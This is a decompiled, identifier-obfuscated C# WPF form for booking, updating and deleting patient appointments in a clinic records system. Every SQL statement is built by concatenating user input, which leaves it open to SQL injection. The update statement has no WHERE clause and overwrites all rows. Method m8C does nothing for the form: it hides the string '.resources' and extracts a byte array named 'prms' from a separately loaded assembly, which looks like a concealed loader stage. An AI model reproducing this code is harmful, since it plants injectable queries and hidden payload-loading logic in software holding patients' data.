using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;
using Ck2;
using Je8;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using k9F;

namespace Pb3;

[DesignerGenerated]
public class Ko1 : Window, IComponentConnector
{
	private ComboBox _cbopatientsID;

	private ComboBox _txtdocID;

	private DatePicker _dtpicker;

	private Button _buttonSave;

	private Button _buttonUpdate;

	private Button _buttonSearch;

	private Button _buttonDelete;

	private Button _btnmovenext;

	private Label _lblstring;

	private Button _btnnext;

	private Button _btnprevious1;

	private Button _buttonadd;

	private bool _contentLoaded;

	internal int m;

	internal DataTable h;

	internal TextBox L;

	internal TextBox Y;

	internal Button k;

	internal Button J;

	internal Button c;

	internal Button u;

	internal Button g;

	internal TextBox s;

	internal Button D;

	public Ko1()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((FrameworkElement)this).add_Loaded(new RoutedEventHandler(f2E));
		m = 0;
		DataTable dataTable = (h = new DataTable());
		m6H();
	}

	private void f2E(object sender, RoutedEventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		string text = Conversions.ToString(((ContentControl)An7()).get_Content());
		SqlConnection val = new SqlConnection(text);
		SqlCommand val2 = new SqlCommand();
		new SqlCommand();
		val2.set_Connection(val);
		val.Open();
		val2.set_CommandText("Select * from Patients_registration");
		SqlDataReader val3 = val2.ExecuteReader();
		SqlDataReader val4 = val3;
		while (val4.Read())
		{
			((ItemsControl)Bt2()).get_Items().Add(RuntimeHelpers.GetObjectValue(val4.GetValue(5)));
		}
		val4 = null;
		val3.Close();
		val2.set_Connection(val);
		val2.set_CommandText("Select * from Doctors");
		val3 = val2.ExecuteReader();
		SqlDataReader val5 = val3;
		while (val5.Read())
		{
			((ItemsControl)m5C()).get_Items().Add(RuntimeHelpers.GetObjectValue(val5.GetValue(3)));
		}
		val5 = null;
		val3.Close();
		int num = (m = h.Rows.Count);
		b9W(m);
	}

	private void Gb8(object sender, MouseEventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = Bt2().get_Text();
			string text2 = Conversions.ToString(((ContentControl)An7()).get_Content());
			SqlConnection val = new SqlConnection(text2);
			SqlCommand val2 = new SqlCommand();
			new SqlCommand();
			val2.set_Connection(val);
			val.Open();
			val2.set_CommandText("Select * from patients_registration where Id_no='" + Conversions.ToString(Conversion.Val(text)) + "'");
			SqlDataReader val3 = val2.ExecuteReader();
			SqlDataReader val4 = val3;
			val4.Read();
			x6H().set_Text(Conversions.ToString(val4.GetValue(0)));
			val4 = null;
			val3.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void d0Q(object sender, MouseEventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = m5C().get_Text();
			string text2 = Conversions.ToString(((ContentControl)An7()).get_Content());
			SqlConnection val = new SqlConnection(text2);
			SqlCommand val2 = new SqlCommand();
			new SqlCommand();
			val2.set_Connection(val);
			val.Open();
			val2.set_CommandText("Select * from Doctors where Doctor_Employment_Number='" + Conversions.ToString(Conversion.Val(text)) + "'");
			SqlDataReader val3 = val2.ExecuteReader();
			SqlDataReader val4 = val3;
			val4.Read();
			o0N().set_Text(Conversions.ToString(val4.GetValue(0)));
			val4 = null;
			val3.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Jz0(object sender, RoutedEventArgs e)
	{
		k5K().set_Text("");
		Bt2().set_Text("");
		x6H().set_Text("");
		m5C().set_Text("");
		o0N().set_Text("");
		g3S().set_Text("");
		int num = (m = checked(h.Rows.Count - 1));
		Ja6(m);
	}

	public void Ja6(int Md4)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		string text = Conversions.ToString(((ContentControl)An7()).get_Content());
		SqlConnection val = new SqlConnection(text);
		SqlCommand val2 = new SqlCommand();
		new SqlCommand();
		val2.set_Connection(val);
		val.Open();
		val2.set_CommandText("Select * from Appointments");
		SqlDataAdapter val3 = new SqlDataAdapter(val2);
		((DbDataAdapter)(object)val3).Fill(h);
		DataTable dataTable = h;
		try
		{
			int num = Conversions.ToInteger(dataTable.Rows[Md4][0]);
			if (num == 0)
			{
				k5K().set_Text(Conversions.ToString(0));
			}
			else
			{
				int num2 = checked(1 + num);
				k5K().set_Text(Conversions.ToString(num2));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		dataTable = null;
	}

	private void Kq0(object sender, RoutedEventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Expected O, but got Unknown
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		new t0Q();
		string text = Conversions.ToString(((ContentControl)An7()).get_Content());
		SqlConnection val = new SqlConnection(text);
		SqlCommand val2 = new SqlCommand();
		new SqlCommand();
		try
		{
			val2.set_Connection(val);
			val.Open();
			val2.set_CommandText("insert into Appointments(Appointment_No,Patients_ID,Patients_Name,Doctor_ID,Doctor_Name,Date) Values\n        ('" + k5K().get_Text() + "','" + Bt2().get_Text() + "','" + x6H().get_Text() + "','" + m5C().get_Text() + "','" + o0N().get_Text() + "','" + g3S().get_Text() + "')");
			val2.ExecuteNonQuery();
			MessageBox.Show("Appointment Booked Succesfully", "Kapenguria Patients MIS", (MessageBoxButton)1);
			val.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		int num = (m = checked(h.Rows.Count - 1));
		b9W(m);
	}

	private void Gz7(object sender, RoutedEventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		int num = Conversions.ToInteger(Interaction.InputBox("Enter Appointment No to search", "", "", -1, -1));
		string text = Conversions.ToString(((ContentControl)An7()).get_Content());
		SqlConnection val = new SqlConnection(text);
		SqlCommand val2 = new SqlCommand();
		new SqlCommand();
		val2.set_Connection(val);
		val.Open();
		val2.set_CommandText("Select * from Appointments where Appointment_No='" + Conversions.ToString(Conversion.Val((object)num)) + "'");
		SqlDataReader val3 = val2.ExecuteReader();
		SqlDataReader val4 = val3;
		val4.Read();
		k5K().set_Text(Conversions.ToString(val4.GetValue(0)));
		Bt2().set_Text(Conversions.ToString(val4.GetValue(1)));
		x6H().set_Text(Conversions.ToString(val4.GetValue(2)));
		m5C().set_Text(Conversions.ToString(val4.GetValue(3)));
		o0N().set_Text(Conversions.ToString(val4.GetValue(4)));
		g3S().set_Text(Conversions.ToString(val4.GetValue(5)));
		val4 = null;
		val3.Close();
	}

	private void d7E(object sender, RoutedEventArgs e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		string text = Conversions.ToString(((ContentControl)An7()).get_Content());
		SqlConnection val = new SqlConnection(text);
		SqlCommand val2 = new SqlCommand();
		new SqlCommand();
		val2.set_Connection(val);
		val.Open();
		val2.set_CommandText("update Appointments set Appointment_No='" + k5K().get_Text() + "',Patients_ID='" + Bt2().get_Text() + "',Patients_Name='" + x6H().get_Text() + "',\nDoctor_Name='" + o0N().get_Text() + "',Date='" + g3S().get_Text() + "'");
		val2.ExecuteNonQuery();
		MessageBox.Show("Appointment Updated Succesful", "Kapenguria Patients MIS", (MessageBoxButton)1);
		val.Close();
	}

	private void Bs8(object sender, RoutedEventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_0155: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Invalid comparison between Unknown and I4
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		int num = Conversions.ToInteger(Interaction.InputBox("Enter Appointment No to search", "", "", -1, -1));
		string text = Conversions.ToString(((ContentControl)An7()).get_Content());
		SqlConnection val = new SqlConnection(text);
		SqlCommand val2 = new SqlCommand();
		new SqlCommand();
		val2.set_Connection(val);
		val.Open();
		val2.set_CommandText("Select * from Appointments where Appointment_No='" + Conversions.ToString(Conversion.Val((object)num)) + "'");
		SqlDataReader val3 = val2.ExecuteReader();
		try
		{
			SqlDataReader val4 = val3;
			val4.Read();
			k5K().set_Text(Conversions.ToString(val4.GetValue(0)));
			Bt2().set_Text(Conversions.ToString(val4.GetValue(1)));
			x6H().set_Text(Conversions.ToString(val4.GetValue(2)));
			m5C().set_Text(Conversions.ToString(val4.GetValue(3)));
			o0N().set_Text(Conversions.ToString(val4.GetValue(4)));
			g3S().set_Text(Conversions.ToString(val4.GetValue(5)));
			val4 = null;
			val3.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		MessageBoxResult val5 = MessageBox.Show("Please confirm you want to delete this record", "Freeing Up Some Space", (MessageBoxButton)4);
		if ((int)val5 != 6)
		{
			if ((int)val5 == 7)
			{
			}
		}
		else
		{
			val2.set_CommandText("Delete from Appointments where Appointment_No='" + Conversions.ToString(Conversion.Val((object)num)) + "'");
			val2.ExecuteNonQuery();
			MessageBox.Show("its been a pleasure Freeing up some space, Delete Succesfull");
			val.Close();
		}
	}

	public void b9W(int Dp9)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		string text = Conversions.ToString(((ContentControl)An7()).get_Content());
		SqlConnection val = new SqlConnection(text);
		SqlCommand val2 = new SqlCommand();
		new SqlCommand();
		val2.set_Connection(val);
		val.Open();
		val2.set_CommandText("Select * from Appointments");
		SqlDataAdapter val3 = new SqlDataAdapter(val2);
		((DbDataAdapter)(object)val3).Fill(h);
		DataTable dataTable = h;
		try
		{
			k5K().set_Text(dataTable.Rows[Dp9][0].ToString());
			Bt2().set_Text(dataTable.Rows[Dp9][1].ToString());
			x6H().set_Text(dataTable.Rows[Dp9][2].ToString());
			m5C().set_Text(dataTable.Rows[Dp9][3].ToString());
			o0N().set_Text(dataTable.Rows[Dp9][4].ToString());
			g3S().set_Text(dataTable.Rows[Dp9][5].ToString());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
		dataTable = null;
	}

	internal static byte[] m8C(string[] Hs4, int La9)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[Hs4.Length - 1 + 1];
				int num = Hs4.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						string value = string.Format("{0}{1}{2}{3}{4}", ".r", "es", "ou", "rc", "es");
						if (Hs4[i].Contains(value))
						{
							int startIndex = Hs4[i].IndexOf(value);
							array[i] = Hs4[i].Remove(startIndex, 10);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)c4L.mDic["o"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "prms", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	private void Qj5(object sender, RoutedEventArgs e)
	{
		checked
		{
			m++;
			b9W(m);
		}
	}

	private void Xi2(object sender, RoutedEventArgs e)
	{
		checked
		{
			m--;
			b9W(m);
		}
	}

	private void Er5(object sender, RoutedEventArgs e)
	{
		m = 0;
		b9W(m);
	}

	private void Sp8(object sender, RoutedEventArgs e)
	{
		int num = (m = checked(h.Rows.Count - 1));
		b9W(m);
	}

	private void w0A(object sender, RoutedEventArgs e)
	{
		Nq6 nq = new Nq6();
		((Window)nq).Show();
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		NewLateBinding.LateCall(objectValue, (Type)null, "Load", new object[1] { "..\\\\Ripoti_Appointment.rpt" }, (string[])null, (Type[])null, (bool[])null, true);
		nq.Ym4().get_ViewerCore().set_ReportSource(RuntimeHelpers.GetObjectValue(objectValue));
	}

	[SpecialName]
	internal virtual ComboBox Bt2()
	{
		return _cbopatientsID;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r2N(ComboBox Be3)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		MouseEventHandler val = new MouseEventHandler(Gb8);
		ComboBox cbopatientsID = _cbopatientsID;
		if (cbopatientsID != null)
		{
			((UIElement)cbopatientsID).remove_MouseLeave(val);
		}
		_cbopatientsID = Be3;
		cbopatientsID = _cbopatientsID;
		if (cbopatientsID != null)
		{
			((UIElement)cbopatientsID).add_MouseLeave(val);
		}
	}

	[SpecialName]
	internal virtual TextBox x6H()
	{
		return L;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Me9(TextBox j0P)
	{
		TextBox val = (L = j0P);
	}

	[SpecialName]
	internal virtual ComboBox m5C()
	{
		return _txtdocID;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qe3(ComboBox m2L)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		MouseEventHandler val = new MouseEventHandler(d0Q);
		ComboBox txtdocID = _txtdocID;
		if (txtdocID != null)
		{
			((UIElement)txtdocID).remove_MouseLeave(val);
		}
		_txtdocID = m2L;
		txtdocID = _txtdocID;
		if (txtdocID != null)
		{
			((UIElement)txtdocID).add_MouseLeave(val);
		}
	}

	[SpecialName]
	internal virtual TextBox o0N()
	{
		return Y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j2R(TextBox Px7)
	{
		TextBox val = (Y = Px7);
	}

	[SpecialName]
	internal virtual DatePicker g3S()
	{
		return _dtpicker;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t6D(DatePicker Wm9)
	{
		_dtpicker = Wm9;
	}

	[SpecialName]
	internal virtual Button n2R()
	{
		return k;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void We0(Button j8K)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Er5);
		Button val2 = k;
		if (val2 != null)
		{
			((ButtonBase)val2).remove_Click(val);
		}
		Button val3 = (k = j8K);
		val2 = k;
		if (val2 != null)
		{
			((ButtonBase)val2).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button t9D()
	{
		return _buttonSave;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Gw0(Button o2X)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Kq0);
		Button buttonSave = _buttonSave;
		if (buttonSave != null)
		{
			((ButtonBase)buttonSave).remove_Click(val);
		}
		_buttonSave = o2X;
		buttonSave = _buttonSave;
		if (buttonSave != null)
		{
			((ButtonBase)buttonSave).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button y8D()
	{
		return _buttonUpdate;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o9Y(Button Lt4)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(d7E);
		Button buttonUpdate = _buttonUpdate;
		if (buttonUpdate != null)
		{
			((ButtonBase)buttonUpdate).remove_Click(val);
		}
		_buttonUpdate = Lt4;
		buttonUpdate = _buttonUpdate;
		if (buttonUpdate != null)
		{
			((ButtonBase)buttonUpdate).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button Eo7()
	{
		return _buttonSearch;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j9P(Button Bq2)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Gz7);
		Button buttonSearch = _buttonSearch;
		if (buttonSearch != null)
		{
			((ButtonBase)buttonSearch).remove_Click(val);
		}
		_buttonSearch = Bq2;
		buttonSearch = _buttonSearch;
		if (buttonSearch != null)
		{
			((ButtonBase)buttonSearch).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button Rb5()
	{
		return _buttonDelete;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void d1X(Button n1T)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Bs8);
		Button buttonDelete = _buttonDelete;
		if (buttonDelete != null)
		{
			((ButtonBase)buttonDelete).remove_Click(val);
		}
		_buttonDelete = n1T;
		buttonDelete = _buttonDelete;
		if (buttonDelete != null)
		{
			((ButtonBase)buttonDelete).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button Tg4()
	{
		return _btnmovenext;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jt1(Button Fj0)
	{
		_btnmovenext = Fj0;
	}

	[SpecialName]
	internal virtual Button Qm2()
	{
		return J;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s6A(Button n9M)
	{
		Button val = (J = n9M);
	}

	[SpecialName]
	internal virtual Button Js9()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s0Z(Button Rk2)
	{
		Button val = (c = Rk2);
	}

	[SpecialName]
	internal virtual Button c6P()
	{
		return u;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wg2(Button Mk0)
	{
		Button val = (u = Mk0);
	}

	[SpecialName]
	internal virtual Button t6B()
	{
		return g;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bx8(Button f7D)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(w0A);
		Button val2 = g;
		if (val2 != null)
		{
			((ButtonBase)val2).remove_Click(val);
		}
		Button val3 = (g = f7D);
		val2 = g;
		if (val2 != null)
		{
			((ButtonBase)val2).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Label An7()
	{
		return _lblstring;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void St9(Label t4N)
	{
		_lblstring = t4N;
	}

	[SpecialName]
	internal virtual TextBox k5K()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f0Z(TextBox k3J)
	{
		TextBox val = (s = k3J);
	}

	[SpecialName]
	internal virtual Button z8P()
	{
		return _btnnext;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xg2(Button t1Z)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Qj5);
		Button btnnext = _btnnext;
		if (btnnext != null)
		{
			((ButtonBase)btnnext).remove_Click(val);
		}
		_btnnext = t1Z;
		btnnext = _btnnext;
		if (btnnext != null)
		{
			((ButtonBase)btnnext).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button p5D()
	{
		return _btnprevious1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t3L(Button a9Q)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Xi2);
		Button btnprevious = _btnprevious1;
		if (btnprevious != null)
		{
			((ButtonBase)btnprevious).remove_Click(val);
		}
		_btnprevious1 = a9Q;
		btnprevious = _btnprevious1;
		if (btnprevious != null)
		{
			((ButtonBase)btnprevious).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button Bj1()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ni6(Button g6Z)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Sp8);
		Button d = D;
		if (d != null)
		{
			((ButtonBase)d).remove_Click(val);
		}
		Button val2 = (D = g6Z);
		d = D;
		if (d != null)
		{
			((ButtonBase)d).add_Click(val);
		}
	}

	[SpecialName]
	internal virtual Button g0J()
	{
		return _buttonadd;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jo2(Button p6P)
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		RoutedEventHandler val = new RoutedEventHandler(Jz0);
		Button buttonadd = _buttonadd;
		if (buttonadd != null)
		{
			((ButtonBase)buttonadd).remove_Click(val);
		}
		_buttonadd = p6P;
		buttonadd = _buttonadd;
		if (buttonadd != null)
		{
			((ButtonBase)buttonadd).add_Click(val);
		}
	}

	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void m6H()
	{
		if (!_contentLoaded)
		{
			_contentLoaded = true;
			Uri uri = new Uri("/PatientRecordManagementSystem;component/appointment.xaml", UriKind.Relative);
			Application.LoadComponent((object)this, uri);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void Gr3(int m6C, object e9R)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fb: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_012b: Expected O, but got Unknown
		//IL_0139: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0173: Expected O, but got Unknown
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Expected O, but got Unknown
		//IL_0193: Unknown result type (might be due to invalid IL or missing references)
		//IL_019d: Expected O, but got Unknown
		//IL_01a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b2: Expected O, but got Unknown
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c7: Expected O, but got Unknown
		//IL_01d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01dc: Expected O, but got Unknown
		switch (m6C)
		{
		case 1:
			r2N((ComboBox)e9R);
			break;
		case 2:
			Me9((TextBox)e9R);
			break;
		case 3:
			Qe3((ComboBox)e9R);
			break;
		case 4:
			j2R((TextBox)e9R);
			break;
		case 5:
			t6D((DatePicker)e9R);
			break;
		case 6:
			We0((Button)e9R);
			break;
		case 7:
			Gw0((Button)e9R);
			break;
		case 8:
			o9Y((Button)e9R);
			break;
		case 9:
			j9P((Button)e9R);
			break;
		case 10:
			d1X((Button)e9R);
			break;
		case 11:
			Jt1((Button)e9R);
			break;
		case 12:
			s6A((Button)e9R);
			break;
		case 13:
			s0Z((Button)e9R);
			break;
		case 14:
			Wg2((Button)e9R);
			break;
		case 15:
			Bx8((Button)e9R);
			break;
		case 16:
			St9((Label)e9R);
			break;
		case 17:
			f0Z((TextBox)e9R);
			break;
		case 18:
			Xg2((Button)e9R);
			break;
		case 19:
			t3L((Button)e9R);
			break;
		case 20:
			Ni6((Button)e9R);
			break;
		case 21:
			Jo2((Button)e9R);
			break;
		default:
			_contentLoaded = true;
			break;
		}
	}
}
